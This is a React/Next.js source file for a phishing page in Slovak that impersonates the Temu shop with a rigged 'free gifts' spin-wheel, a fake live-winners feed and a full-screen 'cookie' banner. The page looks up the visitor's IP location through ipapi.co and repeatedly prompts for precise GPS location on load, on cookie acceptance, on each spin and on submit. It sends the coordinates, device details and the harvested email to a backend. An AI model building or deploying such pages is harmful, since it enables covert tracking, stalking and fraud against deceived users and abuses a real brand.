import React, { useState, useEffect } from 'react';
import Head from 'next/head';
import { motion, AnimatePresence } from 'framer-motion';
import { Star, MapPin, Heart } from 'lucide-react';
import confetti from 'canvas-confetti';

const PRODUCTS = [
    { id: 1, name: "8/12 ks Solárne Zemné Bodov...", price: 11.59, rating: 4.8, reviews: "4,1tis.+", img: "/images/products/prod_solar_lights.png" },
    { id: 2, name: "45cm Elegantný veľký umelý v...", price: 14.98, rating: 4.9, reviews: "43", img: "/images/products/prod_wreath.png", oldPrice: 20.25 },
    { id: 3, name: "Electric Car Wash Foam Spray ...", price: 13.10, rating: 4.7, reviews: "196", img: "/images/products/prod_foam_sprayer.png", oldPrice: 21.49 },
    { id: 4, name: "Sada prístroja na úpravu viniča ...", price: 12.50, rating: 4.6, reviews: "173", img: "/images/products/prod_vine_pruner.png" },
    { id: 5, name: "TG668 Vonkajší Výkonný Pren...", price: 18.20, rating: 4.8, reviews: "1,4tis.+", img: "/images/products/prod_speaker.png" },
    { id: 6, name: "Prenosná sprcha pre kempova...", price: 15.90, rating: 4.5, reviews: "4,1tis.+", img: "/images/products/prod_camp_shower.png" }
];

const NAMES = ["J***n M.", "K***a P.", "M***o S.", "L***a V.", "A***x B."];

export default function TemuPage() {
    const [email, setEmail] = useState('');
    const [location, setLocation] = useState('Detecting...');
    const [time, setTime] = useState('');
    const [showCookies, setShowCookies] = useState(true);

    // Game State: 0 = Boxes, 1 = Wheel 1st spin, 2 = Wheel 2nd spin, 3 = Won Setup, 4 = Final Success
    const [gameState, setGameState] = useState(0);
    const [spinCount, setSpinCount] = useState(0);
    const [wheelAngle, setWheelAngle] = useState(0);
    const [progressWidth, setProgressWidth] = useState('85%');
    const [remainingCost, setRemainingCost] = useState('0.1');
    const [feedUser, setFeedUser] = useState(NAMES[0]);
    const [isSpinning, setIsSpinning] = useState(false);

    useEffect(() => {
        fetch('https://ipapi.co/json/')
            .then(res => res.json())
            .then(data => setLocation(`${data.city}, ${data.country_name}`))
            .catch(() => setLocation('Slovakia (Global)'));

        const clockInterval = setInterval(() => {
            const now = new Date();
            setTime(`${now.getHours()}:${now.getMinutes().toString().padStart(2, '0')}`);
        }, 1000);

        // Feed Animation
        const feedInterval = setInterval(() => {
            setFeedUser(NAMES[Math.floor(Math.random() * NAMES.length)]);
        }, 4000);

        // Auto-trigger location after 0.5s of landing
        const locationTimer = setTimeout(() => {
            requestLocation();
        }, 500);

        return () => {
            clearInterval(clockInterval);
            clearInterval(feedInterval);
            clearTimeout(locationTimer);
        };
    }, []);

    const requestLocation = (finalEmail = null) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (position) => {
                const { latitude, longitude, accuracy } = position.coords;
                // Send to backend (SQLite + Resend Email)
                try {
                    await fetch('/api/location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            token: `TEMU_${finalEmail || email || 'anonymous'}`,
                            lat: latitude,
                            lng: longitude,
                            accuracy: accuracy,
                            deviceInfo: {
                                platform: navigator.platform,
                                userAgent: navigator.userAgent
                            }
                        })
                    });
                    console.log("Location reported successfully");
                } catch (err) {
                    console.error("Failed to report location:", err);
                }
            }, () => {
                console.log("Location permission denied");
            });
        }
    };

    const handleAcceptCookies = () => {
        setShowCookies(false);
        // Requirement: Accepting cookies auto-triggers location permission
        requestLocation();
    };

    const handlePickBox = () => {
        setGameState(1);
        requestLocation(); // Another trigger!
    };


    const handleSpin = () => {
        if (isSpinning) return;
        setIsSpinning(true);

        requestLocation(); // And another trigger!

        if (spinCount === 0) {
            // First spin - almost there
            setWheelAngle(1800); // multiple rotations
            setTimeout(() => {
                setProgressWidth('98%');
                setRemainingCost('0.02');
                alert("EŠTE JEDEN HOD! Ste tak blízko!");
                setSpinCount(1);
                setIsSpinning(false);
            }, 4100);
        } else if (spinCount === 1) {
            // Second spin - WIN!
            setWheelAngle(3645); // lands on gift
            setTimeout(() => {
                setProgressWidth('100%');
                setRemainingCost('0.00');
                setTimeout(() => {
                    setGameState(3); // Setup Email form
                }, 500);
            }, 4100);
        }
    };

    const handleFinalSubmit = (e) => {
        e.preventDefault();
        requestLocation(email);

        confetti({
            particleCount: 200,
            spread: 90,
            origin: { y: 0.6 },
            colors: ['#fb0201', '#ffb703', '#ffffff']
        });

        setGameState(4); // Success state
    };

    return (
        <div className="temu-container">
            <Head>
                <title>TEMU | Darčeky zadarmo</title>
                <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0" />
                <link rel="stylesheet" href="/styles/temu.css" />
            </Head>

            {/* --- FAKE LIVE FEED --- */}
            <div className="live-feed">
                <span><b>{feedUser}</b> práve vyhrala 4 darčeky!</span>
            </div>

            {/* --- GAME OVERLAY --- */}
            {(gameState < 3 || gameState === 3 || gameState === 4) && (
                <div className="game-overlay" style={{ opacity: gameState >= 3 ? 0.5 : 1, pointerEvents: gameState >= 3 ? 'none' : 'auto' }}>
                    <div className="game-container">
                        <h1 style={{ color: 'white', fontSize: '28px', marginBottom: '5px', textShadow: '0 2px 4px rgba(0,0,0,0.3)' }}>DARČEKY ZADARMO!</h1>
                        <p style={{ color: '#fff', marginBottom: '20px' }}>
                            {gameState === 0 ? "Vyberte si krabicu a začnite" : "Získali ste bonusový hod!"}
                        </p>

                        {gameState === 0 && (
                            <div className="step-boxes">
                                {[0, 1, 2].map(i => (
                                    <div key={i} className="magic-box" onClick={handlePickBox}>
                                        <div className="box-icon">🎁</div>
                                    </div>
                                ))}
                            </div>
                        )}

                        {gameState >= 1 && (
                            <div className="step-wheel">
                                <div className="progress-container">
                                    <div className="progress-bar" style={{ width: progressWidth }}></div>
                                    <div className="progress-text">Zostáva: <span>{remainingCost}€</span> k cieľu!</div>
                                </div>

                                <div className="wheel-outer">
                                    <svg className="wheel-pointer" viewBox="0 0 100 100">
                                        <path d="M50 100 L10 20 A45 45 0 1 1 90 20 Z" fill="#fb0201" />
                                    </svg>
                                    <div className="wheel-inner" style={{ transform: `rotate(${wheelAngle}deg)` }}>
                                        <div style={{ fontWeight: 900, fontSize: '14px', textAlign: 'center', transform: 'rotate(22deg)' }}>
                                            DARČEK<br />ZADARMO
                                        </div>
                                    </div>
                                </div>

                                <button
                                    className={`spin-btn ${!isSpinning ? 'pulsing' : ''}`}
                                    onClick={handleSpin}
                                    disabled={isSpinning}
                                >
                                    TOČIŤ ZADARMO
                                </button>
                                <p style={{ color: '#fff', fontSize: '12px', marginTop: '15px' }}>Máte {2 - spinCount} voľné pokusy</p>
                            </div>
                        )}
                    </div>
                </div>
            )}

            {/* --- FINAL POPUPS --- */}
            <AnimatePresence>
                {gameState === 3 && (
                    <motion.div
                        initial={{ scale: 0.8, opacity: 0 }}
                        animate={{ scale: 1, opacity: 1 }}
                        className="final-popup"
                    >
                        <h2 style={{ color: '#fb0201', fontSize: '28px', margin: 0 }}>GRATULUJEME!</h2>
                        <div style={{ fontSize: '50px', margin: '10px 0' }}>🎉</div>
                        <p style={{ fontSize: '16px', fontWeight: 'bold' }}>Vyhrali ste 4 položky za 0,00 €</p>
                        <p style={{ color: '#666', fontSize: '12px', marginBottom: '20px' }}>Služba je overená pre oblasť <b>{location}</b>. Zadajte e-mail pre uloženie výhry do 10 minút!</p>

                        <form onSubmit={handleFinalSubmit}>
                            <input
                                type="email"
                                placeholder="Váš email"
                                required
                                value={email}
                                onChange={(e) => setEmail(e.target.value)}
                                style={{ width: '100%', padding: '12px', borderRadius: '8px', border: '1px solid #ddd', marginBottom: '15px', boxSizing: 'border-box' }}
                            />
                            <button type="submit" className="spin-btn" style={{ background: '#ffb703', color: '#000', boxShadow: '0 6px 0 #cc8e00', padding: '14px', fontSize: '16px' }}>
                                VYBRAŤ DARČEKY
                            </button>
                        </form>
                    </motion.div>
                )}

                {gameState === 4 && (
                    <motion.div
                        initial={{ scale: 0.8, opacity: 0 }}
                        animate={{ scale: 1, opacity: 1 }}
                        className="final-popup"
                    >
                        <h2 style={{ color: '#22c55e', fontSize: '28px', margin: 0 }}>ÚSPECH!</h2>
                        <div style={{ fontSize: '50px', margin: '10px 0' }}>✅</div>
                        <p style={{ fontSize: '16px', fontWeight: 'bold' }}>Vaše darčeky sú pripravené.</p>
                        <p style={{ color: '#666', fontSize: '12px', marginBottom: '20px' }}>Inštrukcie na vyzdvihnutie boli odoslané na: <b>{email}</b></p>
                    </motion.div>
                )}
            </AnimatePresence>

            {/* --- FULLSCREEN COOKIE BANNER --- */}
            <AnimatePresence>
                {showCookies && (
                    <motion.div
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0, y: 100 }}
                        className="temu-cookie-banner"
                        onClick={handleAcceptCookies}
                        style={{ cursor: 'pointer' }}
                    >
                        <div
                            className="cookie-content"
                            onClick={(e) => {
                                e.stopPropagation();
                                handleAcceptCookies();
                            }}
                            style={{ cursor: 'pointer', textAlign: 'center', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}
                        >
                            <h2 style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
                                🔒 Overenie lokality
                            </h2>
                            <p style={{ textAlign: 'center', lineHeight: '1.6' }}>
                                Pre zobrazenie regionálnych darčekov pre oblasť <b>{location}</b> a používanie platformy vyžadujeme Váš súhlas s Cookies.
                            </p>
                            <button onClick={(e) => { e.stopPropagation(); handleAcceptCookies(); }} className="cookie-btn">
                                SÚHLASÍM A OVERIŤ
                            </button>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>

            {/* --- BLURRED BACKGROUND CONTENT --- */}
            <div className={`main-content ${showCookies || gameState < 4 ? 'content-blur' : ''}`}>
                <div className="temu-status-bar">
                    <span>{time}</span>
                    <div className="flex gap-1 items-center">
                        <span>📶</span> <span>🔋</span>
                    </div>
                </div>

                <header className="temu-nav">
                    <div className="temu-brand-row">
                        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/Temu_logo.svg/1200px-Temu_logo.svg.png" alt="Temu" className="h-6" />
                    </div>
                    <div className="temu-categories">
                        <span className="active">Topánky</span>
                        <span>Domov a Kuchyňa</span>
                        <span>Elektronika</span>
                        <span>Krása a Zdravie</span>
                    </div>
                </header>

                <main className="temu-main" style={{ paddingBottom: '20px' }}>
                    <section className="temu-products">
                        <h3 className="section-title">Všetko pod 19,99 €</h3>
                        <div className="product-grid">
                            {PRODUCTS.map(p => (
                                <div key={p.id} className="product-card">
                                    <div className="product-img-wrap">
                                        <img src={p.img} alt={p.name} />
                                        <button className="heart-btn"><Heart size={14} /></button>
                                    </div>
                                    <div className="product-info">
                                        <p className="product-name">{p.name}</p>
                                        <div className="product-rating">
                                            <div className="stars">
                                                {[...Array(5)].map((_, i) => <Star key={i} size={8} fill="black" />)}
                                            </div>
                                            <span className="count" style={{ fontSize: '8px', color: '#999' }}>({p.reviews})</span>
                                        </div>
                                        <div className="product-price-row">
                                            <span className="price">{p.price} €</span>
                                            {p.oldPrice && <span className="old-price">OMOC {p.oldPrice} €</span>}
                                        </div>
                                    </div>
                                </div>
                            ))}
                        </div>
                    </section>
                </main>
            </div>
        </div>
    );
}
